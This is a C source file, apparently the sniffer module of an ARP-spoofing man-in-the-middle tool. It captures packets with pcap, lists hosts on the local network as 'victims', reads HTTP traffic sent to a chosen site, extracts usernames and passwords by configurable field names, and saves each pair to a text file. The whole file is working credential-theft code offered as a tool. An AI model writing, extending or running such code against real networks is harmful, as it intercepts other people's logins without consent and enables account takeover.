#include "sniffer.h"
#include "tools.h"
#include "arp.h" 

void save_credential_to_file(const char *username, const char *password, const char *raw_data) {
    char filename[100];
    char safe_user[50] = {0};
    int j=0;
    
    for(int i=0; i<strlen(username) && j<40; i++) {
        if(isalnum(username[i])) safe_user[j++] = username[i];
    }
    if(j==0) strcpy(safe_user, "unknown");
    
    snprintf(filename, sizeof(filename), "%s.txt", safe_user);

    FILE *fp = fopen(filename, "a");
    if (fp) {
        time_t now = time(NULL);
        char *time_str = ctime(&now);
        time_str[strlen(time_str)-1] = '\0';

        fprintf(fp, "\n========================================\n");
        fprintf(fp, "[Time]: %s\n", time_str);
        fprintf(fp, "User: %s\n", username);
        fprintf(fp, "Pass: %s\n", password);
        fprintf(fp, "========================================\n");

        fclose(fp);
        printf("[+] Credentials saved to %s\n", filename);
    }
}


void extract_value(const char *payload, const char *key, char *buffer, int buf_len) {
    char *start = strstr((char *)payload, key);
    if (!start) {
        strcpy(buffer, "(not found)");
        return;
    }
    
    start += strlen(key);
    
    int i = 0;
    
    while (i < buf_len - 1 && start[i] != '&' && start[i] != '\0' && start[i] != '\r' && start[i] != '\n') {
        buffer[i] = start[i];
        i++;
    }
    buffer[i] = '\0';
}


void parse_http(MitmContext *ctx, const u_char *payload, int len) {
    // 1. 尋找使用者定義的關鍵字 
    char *user_ptr = strstr((char *)payload, ctx->user_key);
    char *pass_ptr = strstr((char *)payload, ctx->pass_key);

    if (user_ptr && pass_ptr) {
       
        static time_t last_time = 0;
        if (time(NULL) - last_time < 1) return;
        last_time = time(NULL);

        printf("\n\033[1;32m[!] DETECTED CREDENTIALS!\033[0m\n");
        
        char username[128] = {0};
        char password[128] = {0};

        // 2. 使用 ctx 中的關鍵字進行提取
        extract_value((const char*)payload, ctx->user_key, username, sizeof(username));
        extract_value((const char*)payload, ctx->pass_key, password, sizeof(password));
        
        printf("Key [%s]: %s\n", ctx->user_key, username);
        printf("Key [%s]: %s\n", ctx->pass_key, password);

        // 備份一部分 Payload (用於除錯或完整記錄)
        char buffer[1024];
        int capture_len = (len > 1023) ? 1023 : len;
        int j = 0;
        for(int i=0; i<capture_len; i++) {
            if(payload[i] >= 32 && payload[i] <= 126) buffer[j++] = payload[i];
            else buffer[j++] = '.';
        }
        buffer[j] = '\0';

        save_credential_to_file(username, password, buffer);
    }
}

void add_new_victim(MitmContext *ctx, uint32_t ip, uint8_t *mac) {
    for(int i=0; i<ctx->target_count; i++) {
        if(ctx->targets[i].ip == ip) return; 
    }
    if(ctx->target_count >= MAX_TARGETS) return;

    int idx = ctx->target_count;
    ctx->targets[idx].ip = ip;
    memcpy(ctx->targets[idx].mac, mac, 6);
    ctx->targets[idx].active = 1;
    ctx->target_count++;

    printf("\n[+] New Victim Found! IP: ");
    struct in_addr addr; addr.s_addr = ip;
    printf("%s ", inet_ntoa(addr));
    print_mac("MAC", mac);
}

void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {
    MitmContext *ctx = (MitmContext *)args;
    struct my_ethhdr *eth = (struct my_ethhdr *)packet;

    // 1. 處理 ARP 
    if (ntohs(eth->ether_type) == ETHERTYPE_ARP) {
        struct my_arphdr *arp = (struct my_arphdr *)(packet + sizeof(struct my_ethhdr));
        if (ntohs(arp->ar_op) == ARPOP_REPLY) {
            uint32_t sender_ip;
            memcpy(&sender_ip, arp->ar_sip, 4);
            if (sender_ip != ctx->my_ip && sender_ip != ctx->gateway_ip) {
                add_new_victim(ctx, sender_ip, arp->ar_sha);
            }
        }
        return; 
    }

    // 2. 處理 IP
    if (ntohs(eth->ether_type) != ETHERTYPE_IP) return;

    struct my_iphdr *ip_hdr = (struct my_iphdr *)(packet + sizeof(struct my_ethhdr));
    int header_len = sizeof(struct my_ethhdr) + (ip_hdr->ihl * 4);

    // 3. 處理 TCP 並解析 HTTP
    if (ip_hdr->daddr == ctx->target_site_ip && ip_hdr->protocol == 6) { 
        struct my_tcphdr *tcp = (struct my_tcphdr *)(packet + header_len);
        int tcp_len = tcp->doff * 4;
        int payload_len = header->caplen - header_len - tcp_len;
        const u_char *payload = packet + header_len + tcp_len;
        
        // 只要有 Payload 就檢查
        if (payload_len > 0) {
            parse_http(ctx, payload, payload_len);
        }
    }

}

void start_sniffer(MitmContext *ctx) {
    pcap_loop(ctx->handle, -1, process_packet, (u_char *)ctx);
}